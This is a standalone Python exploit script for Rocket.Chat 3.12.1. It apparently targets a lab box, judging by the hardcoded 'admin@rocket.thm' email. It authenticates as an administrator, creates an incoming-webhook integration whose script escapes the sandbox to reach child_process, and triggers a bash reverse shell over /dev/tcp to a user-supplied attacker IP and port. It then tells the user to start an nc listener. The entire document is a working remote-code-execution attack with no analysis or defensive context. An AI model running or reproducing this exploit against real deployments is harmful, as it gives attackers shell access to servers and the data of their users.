#!/usr/bin/python

import requests
import string
import time
import hashlib
import json
import argparse

parser = argparse.ArgumentParser(description='RocketChat 3.12.1 RCE')
parser.add_argument('-u', help='Low priv user email [ No 2fa ]', required=True)
parser.add_argument('-a', help='Administrator email', required=True)
parser.add_argument('-t', help='URL (Eg: http://rocketchat.local)', required=True)
parser.add_argument('-i', help='Ip_address', required=True)
parser.add_argument('-p', help='port', required=True)
args = parser.parse_args()


adminmail = args.a
lowprivmail = args.u
target = args.t
port = args.p
ip_address = args.i

def rce(url,ip_address,port):
	# Authenticating
	sha256pass = hashlib.sha256(b'P@$$w0rd!1234').hexdigest()
	headers={'content-type': 'application/json'}
	payload = '{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"login\\",\\"params\\":[{\\"user\\":{\\"email\\":\\"'+"admin@rocket.thm"+'\\"},\\"password\\":{\\"digest\\":\\"'+sha256pass+'\\",\\"algorithm\\":\\"sha-256\\"}}]}"}'
	r = requests.post(url + "/api/v1/method.callAnon/login",data=payload,headers=headers,verify=False,allow_redirects=False)
	if "error" in r.text:
		exit("[-] Couldn't authenticate")
	data = json.loads(r.text)
	data =(data['message'])
	userid = data[32:49]
	token = data[60:103]
	print("[+] Succesfully authenticated as administrator")

	# Creating Integration
	payload = '{"enabled":true,"channel":"#general","username":"admin",'
	payload += '"name":"wow","alias":"","avatarUrl":"","emoji":"",'
	payload += '"scriptEnabled":true,"script":'
	payload += '"class Script {\\n\\n  process_incoming_request({ request }) {\\n\\n\\tconst require = console.log.constructor(\'return process.mainModule.require\')();\\n\\tconst { exec } = require(\'child_process\');\\n\\texec(\'bash -c \\\"bash -i >& /dev/tcp/' + str(ip_address) + '/' + str(port) + ' 0>&1\\\"\');\\n}\\n}",'
	payload += '"type":"webhook-incoming"}'

	cookies = {'rc_uid': userid,'rc_token': token}
	headers = {'X-User-Id': userid,'X-Auth-Token': token}
	r = requests.post(url+'/api/v1/integrations.create',cookies=cookies,headers=headers,data=payload)
	data = r.json()
	_id = data["integration"]["_id"]
	token = data["integration"]["token"]

	# Triggering RCE
	u = url + '/hooks/' + _id + '/' +token 
	r = requests.get(u) 
	print(r.text)

############################################################


## Authenticating and triggering rce
input("Start nc listener on your chosen port and press 'Enter'")
rce(target,ip_address,port)
